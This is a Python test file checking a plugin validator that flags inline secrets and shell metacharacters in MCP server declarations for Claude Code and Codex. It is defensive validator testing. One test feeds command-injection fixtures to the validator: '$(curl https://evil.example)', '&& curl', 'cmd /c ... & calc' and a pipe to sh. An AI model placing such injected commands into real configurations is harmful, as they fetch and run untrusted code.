# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0

"""Secret and shell-metacharacter heuristics, and Tier 1 advisories (check 4): proof bug L9.

The fixtures follow check-04 edge-06 (secret heuristic probes), edge-02 (Codex
auth fields), and check-11 e16 (a PEP 440 range in argv). They run the real
plugin schema validator in the Claude Code and Codex formats, plus the Tier 3
staging gate.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from skillevaluator.models.result import Severity, ValidationResult
from skillevaluator.tier3.plugin_eval import _reject_unsafe_mcp_declaration
from skillevaluator.validators.plugin_schema import PluginSchemaValidator

_CODEX_MANIFEST = {
    "name": "demo",
    "version": "1.0.0",
    "description": "Heuristic probe (Codex)",
    "author": {"name": "Example Dev"},
    "interface": {
        "displayName": "Heuristic probe",
        "shortDescription": "Heuristic probe",
        "longDescription": "A plugin used to test MCP secret heuristics.",
        "developerName": "Example Dev",
        "category": "Productivity",
        "capabilities": ["Interactive"],
        "websiteURL": "https://example.com",
        "privacyPolicyURL": "https://example.com/privacy",
        "termsOfServiceURL": "https://example.com/terms",
        "defaultPrompt": ["Say hello"],
    },
}
_PKG = "@scope/server@1.2.3"


def _plugin(root: Path, servers: dict[str, dict], *, codex: bool = False) -> Path:
    manifest = (
        (".codex-plugin/plugin.json", _CODEX_MANIFEST)
        if codex
        else (".claude-plugin/plugin.json", {"name": "demo", "version": "1.0.0", "description": "Heuristic probe"})
    )
    for rel, content in (manifest, (".mcp.json", {"mcpServers": servers})):
        (root / rel).parent.mkdir(parents=True, exist_ok=True)
        (root / rel).write_text(json.dumps(content), encoding="utf-8")
    return root


def _findings(servers: dict[str, dict], tmp_path: Path, *, codex: bool = False) -> ValidationResult:
    return PluginSchemaValidator().validate(_plugin(tmp_path / ("codex" if codex else "claude"), servers, codex=codex))


def _by_server(result: ValidationResult) -> dict[str, dict[str, Severity]]:
    found: dict[str, dict[str, Severity]] = {}
    for finding in result.findings:
        server = finding.metadata.get("mcp_server")
        if server and finding.check_name != "mcp_field_ignored":
            found.setdefault(server, {})[finding.check_name] = finding.severity
    return found


def _npx(*extra: str, **config: object) -> dict:
    return {"command": "npx", "args": ["-y", _PKG, *extra], **config}


# check-04 edge-06, plus neutral controls
_PROBES = {
    "fp-policy": _npx(env={"PASSWORD_POLICY": "strict"}),
    "fp-file": _npx(env={"DB_PASSWORD_FILE": "/run/secrets/db"}),
    "fp-min-length": _npx(env={"PASSWORD_MIN_LENGTH": "12"}),
    "fp-bool": _npx(env={"REQUIRE_PASSWORD": "true"}),
    "fp-argv-pipe": _npx("--pattern", "foo|bar"),
    "fp-auth-mode": _npx("--auth", "basic"),
    "fp-commit": _npx(env={"GIT_COMMIT_SHA": "9f2c4e6a8b0d1f3e5a7c9b2d4f6e8a0c1b3d5f7e"}),
    "fp-tenant-uuid": _npx(env={"TENANT": "3f2504e0-4f89-11d3-9a0c-0305e82c3301"}),
    "fn-neutral": _npx(env={"SERVICE_SEED": "9f2c4e6a8b0d1f3e5a7c9b2d4f6e8a0c1b3d5f7e"}),
    "fn-auth-flag": _npx("--auth", "rawFAKEvalue0123"),
    "fn-nested-field": {
        "type": "http",
        "url": "https://mcp.example.com/mcp",
        "oauth": {"clientId": "demo", "clientSecret": "rawFAKEsecret0123"},
    },
    "hit-token-flag": _npx("--token", "rawFAKEvalue0123"),
    "hit-password": _npx(env={"DB_PASSWORD": "hunter2hunter2"}),
}


@pytest.mark.parametrize("codex", [False, True], ids=["claude", "codex"])
def test_secret_heuristics_follow_meaning_not_substrings(tmp_path: Path, codex: bool) -> None:
    findings = _by_server(_findings(_PROBES, tmp_path, codex=codex))

    for name in ("fp-policy", "fp-file", "fp-min-length", "fp-bool", "fp-argv-pipe", "fp-auth-mode"):
        assert name not in findings, (name, findings.get(name))
    assert "fp-commit" not in findings
    assert "fp-tenant-uuid" not in findings
    assert findings["fn-neutral"] == {"mcp_possible_inline_secret": Severity.MEDIUM}
    assert findings["fn-auth-flag"] == {"mcp_command_inline_secret": Severity.CRITICAL}
    assert findings["fn-nested-field"] == {"mcp_inline_secret": Severity.CRITICAL}
    assert findings["hit-token-flag"] == {"mcp_command_inline_secret": Severity.CRITICAL}
    assert findings["hit-password"] == {"mcp_inline_secret": Severity.CRITICAL}


def test_argv_operators_are_text_but_shell_lines_still_block(tmp_path: Path) -> None:
    servers = {
        # check-11 e16: a PEP 440 range in argv was CRITICAL shell metacharacters
        "pep440-range": {"command": "uvx", "args": ["example-mcp>=1.2,<2"]},
        "regex-arg": {"command": "node", "args": ["server.js", "--filter", "a|b;c"]},
        "substitution": {"command": "node", "args": ["server.js", "$(curl https://evil.example)"]},
        "bare-operator": {"command": "node", "args": ["server.js", "&&", "curl", "https://evil.example"]},
        "cmd-line": {"command": "cmd", "args": ["/c", "npx", "-y", _PKG, "&", "calc"]},
        "command-string": {"command": "npx -y @scope/server@1.2.3 | sh"},
    }
    findings = _by_server(_findings(servers, tmp_path))

    assert findings["pep440-range"] == {"mcp_unpinned_package": Severity.MEDIUM}
    assert "regex-arg" not in findings
    for name in ("substitution", "bare-operator", "cmd-line", "command-string"):
        assert findings[name].get("mcp_command_shell_metacharacters") == Severity.CRITICAL, (name, findings[name])


def test_tier3_staging_accepts_the_false_positives() -> None:
    for name in ("fp-policy", "fp-file", "fp-argv-pipe"):
        _reject_unsafe_mcp_declaration(name, _PROBES[name])


def _field_ignored(result: ValidationResult) -> list[str]:
    return [f.message for f in result.findings if f.check_name == "mcp_field_ignored"]


def test_codex_auth_fields_get_a_tier1_advisory(tmp_path: Path) -> None:
    """check-04 edge-02: Tier 1 was clean, then Tier 3 staging marked the run partial with no earlier warning."""
    servers = {
        "api": {
            "type": "streamable-http",
            "url": "https://mcp.example.com/mcp",
            "bearer_token_env_var": "API_TOKEN",
            "env_vars": ["API_REGION"],
            "oauth": {"client_id": "demo-client"},
        }
    }
    messages = _field_ignored(_findings(servers, tmp_path, codex=True))

    assert len(messages) == 3
    for field in ("bearer_token_env_var", "env_vars", "oauth"):
        assert any(f"Codex '{field}'" in message and "INCOMPLETE" in message for message in messages), field


def test_claude_oauth_is_not_a_codex_field(tmp_path: Path) -> None:
    servers = {"api": {"type": "http", "url": "https://mcp.example.com/mcp", "oauth": {"clientId": "demo"}}}

    assert _field_ignored(_findings(servers, tmp_path)) == []


def test_field_ignored_text_names_native_claude_code(tmp_path: Path) -> None:
    servers = {"gh": _npx(env={"GITHUB_TOKEN": "${GITHUB_TOKEN}"})}
    [message] = _field_ignored(_findings(servers, tmp_path))

    assert "natively in Claude Code" in message
    assert "will be ignored" not in message


# --------------------------------------------------------------------------- #
# Review round: short credential keys and path-like secrets                    #
# --------------------------------------------------------------------------- #
# A base64 key that starts with '/' (about one in 64 do), built at run time so the source holds no key literal.
_SLASH_KEY = "/" + "Xk9fT2mQ" + "pL8sR4vW" + "6yZ1aB3c" + "D5eF7gH9" + "iJ0kL2mN4oP"
_SLASH_KEY_TWO_SEGMENTS = "/" + "Xk9fT2mQpL8" + "/" + "sR4vW6yZ1aB3cD5eF7gH9iJ0kL2mN4oP"

_SHORT_KEYS = {
    # 'key', 'pass', 'sig', and 'signature' name a credential in a URL query, not as a flag or env name.
    "key-flag": _npx("--key", "primary"),
    "pass-flag": _npx("--pass", "2"),
    "sig-flag": _npx("--sig", "v2"),
    "signature-flag": _npx("--signature", "sha256"),
    "key-env": _npx(env={"KEY": "primary"}),
    "pass-env": _npx(env={"PASS": "2"}),
    # ... unless the value looks like key material.
    "key-flag-secret": _npx("--key", "rawFAKEvalue0123"),
    "key-env-secret": _npx(env={"KEY": "rawFAKEvalue0123"}),
    # A query key keeps its meaning.
    "query-key": {"type": "http", "url": "https://api.example.com/mcp?key=rawFAKEvalue0123"},
    "query-sig": {"type": "http", "url": "https://api.example.com/mcp?sig=v2"},
}


@pytest.mark.parametrize("codex", [False, True], ids=["claude", "codex"])
def test_short_credential_keys_need_a_secret_value_outside_urls(tmp_path: Path, codex: bool) -> None:
    findings = _by_server(_findings(_SHORT_KEYS, tmp_path, codex=codex))

    for name in ("key-flag", "pass-flag", "sig-flag", "signature-flag", "key-env", "pass-env"):
        assert name not in findings, (name, findings.get(name))
    assert findings["key-flag-secret"] == {"mcp_command_inline_secret": Severity.CRITICAL}
    assert findings["key-env-secret"] == {"mcp_inline_secret": Severity.CRITICAL}
    assert findings["query-key"] == {"mcp_url_inline_secret": Severity.CRITICAL}
    assert findings["query-sig"] == {"mcp_url_inline_secret": Severity.CRITICAL}


_PATH_LIKE = {
    # A value that starts like a path but is one token of key material.
    "slash-key-env": _npx(env={"API_KEY": _SLASH_KEY}),
    "slash-key-flag": _npx("--api-key", _SLASH_KEY),
    "slash-key-two-segments": _npx(env={"API_KEY": _SLASH_KEY_TWO_SEGMENTS}),
    "tilde-token": _npx(env={"API_TOKEN": "~xyzSECRETvalue123"}),
    "dot-password": _npx(env={"DB_PASSWORD": "./not-a-path-really-Secr3t"}),
    # Real paths stay settings.
    "run-secrets": _npx(env={"PRIVATE_KEY": "/run/secrets/key"}),
    "pem-file": _npx(env={"PRIVATE_KEY": "./certs/MyService2024.pem"}),
    "credentials-file": _npx(env={"GOOGLE_APPLICATION_CREDENTIALS": "/Users/Alice/Projects/MyProject2024/creds.json"}),
    "plugin-root-key": _npx(env={"PRIVATE_KEY": "${CLAUDE_PLUGIN_ROOT}/key"}),
    "home-key": _npx("--api-key", "~/.config/example/key"),
}


@pytest.mark.parametrize("codex", [False, True], ids=["claude", "codex"])
def test_path_rule_does_not_hide_a_token_that_starts_with_a_slash(tmp_path: Path, codex: bool) -> None:
    findings = _by_server(_findings(_PATH_LIKE, tmp_path, codex=codex))

    for name in ("slash-key-env", "slash-key-two-segments", "tilde-token", "dot-password"):
        assert findings.get(name) == {"mcp_inline_secret": Severity.CRITICAL}, (name, findings.get(name))
    assert findings["slash-key-flag"] == {"mcp_command_inline_secret": Severity.CRITICAL}
    for name in ("run-secrets", "pem-file", "credentials-file", "plugin-root-key", "home-key"):
        assert name not in findings, (name, findings.get(name))


def test_tier3_staging_follows_the_short_key_and_path_rules() -> None:
    _reject_unsafe_mcp_declaration("key-flag", _SHORT_KEYS["key-flag"])
    _reject_unsafe_mcp_declaration("run-secrets", _PATH_LIKE["run-secrets"])
    with pytest.raises(ValueError, match="mcp_inline_secret"):
        _reject_unsafe_mcp_declaration("slash-key-env", _PATH_LIKE["slash-key-env"])
